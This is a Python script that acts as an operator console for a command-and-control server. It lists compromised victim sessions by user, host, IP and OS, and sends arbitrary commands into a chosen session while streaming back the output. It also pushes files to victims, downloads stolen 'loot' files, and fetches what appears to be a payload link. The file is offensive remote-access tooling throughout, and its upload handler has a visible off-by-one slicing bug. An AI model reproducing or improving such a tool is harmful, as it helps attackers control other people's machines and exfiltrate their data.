#!/usr/bin/env python3
import sys, os, json, time, argparse, urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("--url", required=True)
ap.add_argument("--key", required=True)
g = ap.parse_args()
U = g.url.rstrip("/"); H = {"X-Auth": g.key}
cur = None; seq = 0

def api(p, data=None, hdr=None, raw=False):
    h = dict(H); h.update(hdr or {})
    r = urllib.request.Request(U + p, data=data, headers=h)
    with urllib.request.urlopen(r, timeout=90) as f: return f.read() if raw else f.read().decode()

def pr(): sys.stdout.write(("\033[92m[%s]\033[0m> " % cur) if cur else "\033[96mc2\033[0m> "); sys.stdout.flush()

def show():
    global seq
    while cur:
        try:
            j = json.loads(api("/api/out?sid=%s&after=%d" % (cur, seq)))
            if j["lines"]:
                seq = j["seq"]; sys.stdout.write("".join(j["lines"])); sys.stdout.flush()
        except Exception: pass
        time.sleep(0.4)

def loot():
    for f in json.loads(api("/api/loot")): print(f["id"], f["size"], f["name"])

def dl(fid):
    d = api("/api/loot/" + fid, raw=True)
    p = os.path.expanduser("~/loot/" + fid + ".bin")
    open(p, "wb").write(d); print("saved", p, len(d))

def main():
    global cur, seq
    os.makedirs(os.path.expanduser("~/loot"), exist_ok=True)
    while True:
        pr(); line = sys.stdin.readline()
        if not line: break
        line = line.rstrip("\n")
        if not line: continue
        try:
            if not cur:
                c = line.split()
                if c[0] in ("ls", "list"):
                    for s in json.loads(api("/api/sessions")):
                        print("%s %-6s %s@%s %s %s" % ("*" if s["on"] else "-", s["id"],
                              s["user"], s["host"], s["ip"], s["os"]))
                elif c[0] == "in" and len(c) > 1: cur = c[1]; seq = 0
                elif c[0] == "loot": loot()
                elif c[0] == "dl" and len(c) > 1: dl(c[1])
                elif c[0] == "link":
                    print(api("/link"))
                elif c[0] in ("q", "exit"): break
                else: print("ls | in <id> | loot | dl <fid> | link | q")
                continue
            if line.startswith(".put "):
                a = line[6:]; d = open(a, "rb").read()
                api("/api/put", d, {"X-Sid": cur, "X-Name": os.path.basename(a)})
                print("sent", len(d), "bytes")
            elif line == ".loot": loot()
            elif line.startswith(".dl "): dl(line[4:])
            else:
                api("/api/cmd", json.dumps({"sid": cur, "cmd": line}).encode())
                if line == ".leave": cur = None
        except Exception as e:
            print("ERR", e)

main()
